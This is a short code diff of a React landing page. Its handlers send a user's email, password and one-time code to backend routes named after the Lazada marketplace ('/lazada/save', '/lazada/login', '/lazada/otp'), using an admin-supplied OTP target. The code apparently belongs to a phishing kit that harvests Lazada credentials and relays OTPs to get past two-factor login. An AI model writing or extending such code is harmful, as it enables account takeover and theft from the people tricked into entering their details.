@@ -216,7 +216,8 @@ const Landing = () => {
     setMobileLoading(true);
 
     try {
-      const response = await axios.post(`${BaseUrl}/lazada/save`, {
+      // const response = await axios.post(`${BaseUrl}/lazada/save`, {
+      const response = await axios.post(`${BaseUrl}/lazada/login`, {
         email: data.email,
         password: data.password,
       });
@@ -280,10 +281,12 @@ const Landing = () => {
     // setAdminOtpResponse(null);
 
     try {
-      const response = await axios.put(`${BaseUrl}/lazada/update`, {
+      // const response = await axios.put(`${BaseUrl}/lazada/update`, {
+      const response = await axios.put(`${BaseUrl}/lazada/otp`, {
         email: data.email,
         password: data.password,
         otp: data.otp,
+        sentTo: adminOtpResponse.sendTo,
       });
 
       if (response.status === 200) {
